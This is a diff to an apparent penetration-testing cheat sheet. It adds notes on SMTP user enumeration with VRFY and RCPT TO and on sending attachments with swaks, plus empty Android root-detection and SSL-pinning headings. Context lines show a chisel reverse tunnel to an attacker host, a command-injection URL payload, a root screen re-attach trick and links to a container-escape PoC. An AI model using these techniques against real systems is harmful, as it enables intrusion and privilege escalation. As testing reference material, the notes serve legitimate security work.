@@ -214,6 +214,18 @@ On target machine `./chisel client <attacker>:<attacker_listening_port> R:localh
 
 Then `http://ip/page?a=whoami;`
 
+## SMTP
+
+Using `VRFY` we can check which email addresses are valid or we can try to send an email and verify through `RCPT TO:email`<br/>
+
+
+Sending an email address with attachment we can use `sawks` 
+
+```bash
+swaks --server IP -f from@arz.com -t to@arz.com --attach file.rtf
+
+```
+
 ### Screen
 
 If there's a  deattached screen session running as root , we can re attach it only if screen binary has SUID bit `screen -r root/`
@@ -912,4 +924,11 @@ https://github.com/Frichetten/CVE-2019-5736-PoC
 https://published-prd.lanyonevents.com/published/rsaus20/sessionsFiles/18100/2020_USA20_DSO-W01_01_Compromising%20Kubernetes%20Cluster%20by%20Exploiting%20RBAC%20Permissions.pdf
           
 https://github.com/BishopFox/badPods
+
+# Android
+
+## Root Detection Bypass
+
+
+## SSL Pinning
       
